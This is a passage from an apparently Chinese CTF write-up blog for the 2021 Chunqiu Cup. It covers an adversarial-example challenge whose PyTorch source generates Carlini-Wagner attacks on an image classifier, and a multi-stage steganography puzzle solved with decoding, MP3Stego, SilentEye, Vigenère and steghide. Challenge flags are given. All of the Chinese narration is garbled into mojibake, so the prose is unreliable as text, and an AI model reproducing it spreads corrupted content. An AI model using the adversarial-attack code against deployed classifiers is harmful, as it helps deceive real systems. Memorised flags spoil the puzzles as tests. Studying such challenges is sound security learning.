self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv1_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv2<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv2_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv3<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv3_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> x<span class="token punctuation">.</span>view<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">250</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fc1_bn<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>fc2<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">return</span> x<span class="token comment"># load pretrained model</span>device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">"cuda:0"</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">"cpu"</span><span class="token punctuation">)</span>transform <span class="token operator">=</span> transforms<span class="token punctuation">.</span>ToTensor<span class="token punctuation">(</span><span class="token punctuation">)</span>model <span class="token operator">=</span> Model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>check_point <span class="token operator">=</span> torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'model.pt'</span><span class="token punctuation">,</span> map_location<span class="token operator">=</span>device<span class="token punctuation">)</span>model<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>check_point<span class="token punctuation">)</span>model<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># untargeted CW attack</span>atk <span class="token operator">=</span> torchattacks<span class="token punctuation">.</span>CW<span class="token punctuation">(</span>model<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> kappa<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># generate an adversarial example for each class</span>pairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> cl <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        origin_image <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>glob<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">/*.png'</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>        image <span class="token operator">=</span> transform<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>origin_image<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>        label <span class="token operator">=</span> torch<span class="token punctuation">.</span>tensor<span class="token punctuation">(</span>cl<span class="token punctuation">,</span> device<span class="token operator">=</span>device<span class="token punctuation">)</span>        adv_image <span class="token operator">=</span> atk<span class="token punctuation">(</span>image<span class="token punctuation">,</span> label<span class="token punctuation">)</span>        origin_output <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        adv_output <span class="token operator">=</span> model<span class="token punctuation">(</span>adv_image<span class="token punctuation">)</span>        origin_label <span class="token operator">=</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>origin_output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        adv_label <span class="token operator">=</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>adv_output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> adv_label <span class="token operator">==</span> origin_label<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        transforms<span class="token punctuation">.</span>ToPILImage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>adv_image<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">{</span>origin_label<span class="token punctuation">}</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span>        <span class="token comment"># confirm that the generated adversarial example is working</span>        image <span class="token operator">=</span> transform<span class="token punctuation">(</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">{</span>origin_label<span class="token punctuation">}</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>        output <span class="token operator">=</span> model<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        <span class="token keyword">if</span> torch<span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>output<span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> adv_label<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        pairs<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>origin_image<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'adv_</span><span class="token interpolation"><span class="token punctuation">{</span>origin_label<span class="token punctuation">}</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">,</span> origin_label<span class="token punctuation">,</span> adv_label<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token comment"># remove origin images and move adversarial examples into target classes</span><span class="token keyword">for</span> origin_fname<span class="token punctuation">,</span> adv_fname<span class="token punctuation">,</span> origin_label<span class="token punctuation">,</span> adv_label <span class="token keyword">in</span> pairs<span class="token punctuation">:</span>    os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>adv_fname<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">{</span>adv_label<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>adv_fname<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>origin_fname<span class="token punctuation">)</span><span class="token comment"># shuffle all the images to hide adversarial examples</span>os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'imgs'</span><span class="token punctuation">)</span>adversarial_images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> cl <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    images <span class="token operator">=</span> glob<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'test/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">/*.png'</span></span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'imgs/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>images<span class="token punctuation">)</span>    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> image <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>images<span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>image<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'imgs/</span><span class="token interpolation"><span class="token punctuation">{</span>cl<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>idx<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'adv'</span> <span class="token keyword">in</span> image<span class="token punctuation">:</span>            adversarial_images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token comment"># You can get the flag if you find all the adversarial examples :)</span>flag <span class="token operator">=</span> <span class="token string">'flag{'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'}'</span><span class="token comment"># Give you some hints though you can solve this challenge without them</span>hint1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> pairs<span class="token punctuation">]</span>hint2 <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint1:'</span><span class="token punctuation">,</span> hint1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint2:'</span><span class="token punctuation">,</span> hint2<span class="token punctuation">)</span><span class="token comment"># flag: flag{*********REDACTED**********}</span><span class="token comment"># hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)]</span><span class="token comment"># hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9</span></code></pre><p>å¯ä»¥çœ‹åˆ°ç”¨ Pytorch æ­äº†ä¸€ä¸ªæ¨¡å‹ï¼Œç”Ÿæˆå¯¹æŠ—æ ·æœ¬ï¼Œç„¶åç¡®ä¿ç”Ÿæˆçš„æ ·æœ¬è½å…¥åˆ°æ¨¡å‹çš„å¦ä¸€ä¸ªåˆ†ç±»ä¸­ï¼Œè€Œåå°†å¯¹æŠ—æ ·æœ¬ä¿å­˜ï¼Œæ”¹åå¹¶ç§»é™¤åŸå›¾ã€‚</p><p><em>ï¼ˆé¡ºæ‰‹æŠŠ Pytorch è£…äº†ï¼Œå–µå‘œï¼Œæœ‰ç‚¹å¤§è¿˜æŒºä¹…</em></p><p><code>pairs</code> æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œåˆ†åˆ«æ˜¯ <code>(origin_fname, adv_fname, origin_label, adv_label)</code>ï¼Œå³åŸå›¾å’Œå¯¹æŠ—æ ·æœ¬çš„æ–‡ä»¶è·¯å¾„ã€ç›¸åº”çš„æ ‡ç­¾ã€‚</p><p>çœ‹ä¸€ä¸‹ <code>imgs/</code> ç›®å½•ä¸‹çš„å›¾ç‰‡ï¼Œè¿™ä¸ªå±…ç„¶çœŸçš„è‚‰çœ¼å°±èƒ½æ‰¾å‡ºåŒºåˆ«â€¦â€¦</p><p>å°½ç®¡æ‰“ä¹±äº†å›¾ç‰‡çš„é¡ºåºï¼Œä½†æ˜¯ç”±äº rename å¹¶æ²¡æœ‰å½±å“æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´ï¼Œè€Œè¿™äº›å¯¹æŠ—æ ·æœ¬æ˜¯åé¢ä¿å­˜/åˆ›å»ºçš„ï¼Œäºæ˜¯<strong>ç›´æ¥æŒ‰ç…§æ—¶é—´æ’åº</strong>å°±èƒ½æ‰¾å‡ºæ˜¯å“ªäº›å¯¹æŠ—æ ·æœ¬ã€‚è¿™ä¹Ÿæ˜¯å¾ˆå¤šéé¢„æœŸè§£çš„æ–¹æ³•ã€‚</p><p>è¯•äº†ä¸€ä¸‹ï¼Œæœç„¶å¯ä»¥â€¦â€¦</p><p>Exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token punctuation">,</span> sha256<span class="token comment"># flag: flag{*********REDACTED**********}</span><span class="token comment"># hint1: [(0, 1), (1, 0), (2, 6), (3, 4), (4, 3), (5, 6), (6, 5), (7, 8), (8, 7), (9, 1)]</span><span class="token comment"># hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9</span>adversarial_images <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">273</span><span class="token punctuation">,</span> <span class="token number">293</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">391</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span>hint2 <span class="token operator">=</span> sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint2:'</span><span class="token punctuation">,</span> hint2<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">'flag{'</span> <span class="token operator">+</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>adversarial_images<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'}'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag:'</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token comment"># hint2: 502e0423b82c251f280e4c3261ee4d01dca4f6fe0b663817e9fd43dffefc5ce9</span><span class="token comment"># flag: flag{00d531934c171e1a71405f5e1f171d65}</span></code></pre><blockquote><p><strong>é¢„æœŸè§£</strong>å¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡</p><p><a href="https://www.secpulse.com/archives/152955.html">æ˜¥ç§‹æ¯2021æ–°å¹´æ¬¢ä¹èµ›aié¢˜old_driverè¯¦è§£</a></p><p>ä¸»è¦æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š</p><ol><li>è¯†åˆ«ç»“æœå‰ä¸¤åè¯„åˆ†å·®è·å°</li><li>è¯†åˆ«ç»“æœç¬¬äºŒåè¯„åˆ†é«˜</li><li>å¯¹ç…§ hint1ï¼Œè¯„åˆ†å‰ä¸¤åæ˜¯å·²çŸ¥çš„ =&gt; ä¸æ­£ç¡®çš„è·³è¿‡</li></ol></blockquote><p>åœ¨ä»–çš„ exp åŸºç¡€ä¸Šç¨å¾®æ”¹äº†ä¸‹ï¼Œå¤ç°æˆåŠŸã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204165550254.png" alt="å¤ç°"></p><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><blockquote><ol><li>å¢åŠ hint.txtä¸‹è½½ </li><li>å¯ç”¨pythonç»Ÿè®¡æ¬¡æ•°æœ€å¤šçš„å­—ç¬¦</li></ol></blockquote><p>è€å¥—å¨ƒé¢˜äº†ï¼Œæ¥å¤ç°ä¸€ä¸‹ã€‚</p><p><code>hint.txt</code></p><pre class="language-none"><code class="language-none">NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE======</code></pre><p>base32 =&gt;</p><pre class="language-none"><code class="language-none">http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.htmlhttps://www.ncbi.nlm.nih.gov/orffinder/http://www.merrybio.com.cn/blog/coronavirus-introduction.htmlPlease notice The largest structural protein  the password is the  md5(it's gene sequence) and do not let the â€˜\nâ€™ in md5()</code></pre><p>å…³æ³¨æœ€å¤§çš„ç»“æ„è›‹ç™½ï¼Œpassword æ˜¯åŸºå› åºåˆ—çš„ md5ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204170810700.png" alt="æœ€å¤§çš„ç»“æ„è›‹ç™½"></p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204171205909.png"></p><p>å»çœ‹ç™»å½•å·ä¸º <a href="https://www.ncbi.nlm.nih.gov/nuccore/MN908947.3?report=fasta">MN908947</a> çš„å…¨åŸºå› ç»„åºåˆ—ã€‚</p><p>æŒ‰ç…§ç¬¬ä¸€ç¯‡ä¸­çš„æ€è·¯ï¼Œåˆ©ç”¨ NCBI ä¸Šçš„ ORF finder å·¥å…·å¯¹è¯¥ç—…æ¯’ï¼ˆMN908947) è¿›è¡ŒåŸºå› ç»„æ³¨é‡Šåˆ†æã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204171720392.png"></p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204172558055.png" alt="md5"></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> protein.txt<span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{printf("%s",<span class="token variable">$0</span>)}'</span><span class="token operator">|</span>md5sum98eb1b1760bcc837934c8695a1cee923 *-</code></pre><p>MP3stego è§£ <code>cov.mp3</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">MP3StegoDecode.exe -X -P 98eb1b1760bcc837934c8695a1cee923 cov.mp3</code></pre><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204173106041.png" alt="MP3stego"></p><p>å¾—åˆ° <code>realflag.zip</code> å¯†ç  <code>2019-nCoV</code>ã€‚</p><p>è§£å‹ =&gt; <code>hint2.txt</code> ä»¥åŠ <code>CoV-1.jpg</code></p><pre class="language-none"><code class="language-none">796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154</code></pre><p>base16 =&gt;</p><pre class="language-none"><code class="language-none">you must pay attention to N protein ,How do that get into the viral capsid?do you know steghide?the password is encrypt by VigenÃ¨re Cipherthe screct key is The top 20 characters with the most occurrences are counted+COMBAT</code></pre><p>å†å›åˆ°ç¬¬ä¸€å¼ å›¾é‡Œçš„ æ ¸è¡£å£³è›‹ç™½ï¼ˆnucleoproteinï¼ŒNï¼‰ï¼Œå®ƒå¦‚ä½•è¿›å…¥ç—…æ¯’è¡£å£³å†…ï¼Ÿ</p><p>è¦ç»“åˆ Mã€Eè›‹ç™½ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204181203820.png"></p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204174737634.png" alt="N"></p><p>è¿™é‡Œå¥½å‘å•Šï¼Œè¦æŠŠè¿™ä¸‰ä¸ªè›‹ç™½ä¸€èµ·åˆå¹¶ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204174822048.png"></p><p>ç»Ÿè®¡ä¸€ä¸‹å‡ºç°æ¬¡æ•°æœ€å¤šçš„20ä¸ªå­—ç¬¦ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTASWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGKMKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRNPANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPGSSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKSAAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKHWPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQVILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADLDDFSKQLQQSMSSADSTQAMADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIKLIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASFRLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLRIAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYRIGNYKLNTDHSSSSDNIALLVQMFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYSQLDEEQPMEID"""</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> d<span class="token punctuation">:</span>        d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># {'M': 14, 'S': 56, 'D': 34, 'N': 37, 'G': 57, 'P': 34, 'Q': 42, 'R': 44, 'A': 57, 'I': 44, 'T': 48, 'F': 27, 'E': 24, 'K': 42, 'L': 70, 'W': 13, 'H': 10, 'V': 23, 'Y': 22, 'C': 4}</span>l <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>r<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>    r <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># LGASTRIQKNDPFEVYMWHC</span><span class="token comment"># LGASTRIQKNDPFEVYMWHCCOMBAT</span></code></pre><p>ç”¨ SilentEye å¯¹ <code>pass.wav</code> è§£å¯†ä¸€ä¸‹ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204175527203.png" alt="silentEye"></p><p>å¾—åˆ° password <code>priebeijoarkjpxmdkucxwdus</code>ã€‚</p><p>ç„¶åç”¨ å‡ºç°æœ€å¤šçš„20ä¸ªå­—ç¬¦ + COMBATï¼Œå³ <code>LGASTRIQKNDPFEVYMWHCCOMBAT</code> è¿™ä¸ªå¯†é’¥ VigenÃ¨re è§£å¯† passwordã€‚</p><p>å¾—åˆ°æœ€ç»ˆçš„ passwordï¼š<code>eliminatenovelcoronavirts</code></p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204181702616.png" alt="password"></p><p>æœ€å steghide è§£å¯†å›¾ç‰‡ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">steghide extract -p eliminatenovelcoronavirts -v -sf CoV-1.jpg</code></pre><p><code>flag{we_will_over_come_SARS-COV}</code></p><p><em>ï¼ˆè€å¥—å¨ƒäº†</em></p><h2 id="è°ƒæŸ¥é—®å·"><a href="#è°ƒæŸ¥é—®å·" class="headerlink" title="è°ƒæŸ¥é—®å·"></a>è°ƒæŸ¥é—®å·</h2><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210201202920108.png"></p><p><code>flag{xinnianfunfunfun}</code></p><!-- TODO ## æŒ‰Fæ³¨å…¥> hintï¼šä¸æ˜¯æ‰€æœ‰sqléƒ½å«PostgreSQLï¼›flagåœ¨webç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶é‡Œã€‚## evilMem> Nothing is true, everything is permitted.## Super Brain> We are performing a rapid chain reaction on S32R274.--><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¯´å¥½çš„æ¬¢ä¹èµ›å‘¢ï¼Œæ¬¢ä¹éƒ½æ˜¯ä¸»åŠæ–¹å’Œå‡ºé¢˜äººçš„ï¼Œå˜¤å˜¤å˜¤ï¼Œå¤ªåäº†ï¼ˆ</p><p>é™¤äº†åå‘ binary ç±»å‹çš„ evilMem å’Œ Super Brainï¼Œè¿˜æœ‰ä¸ª 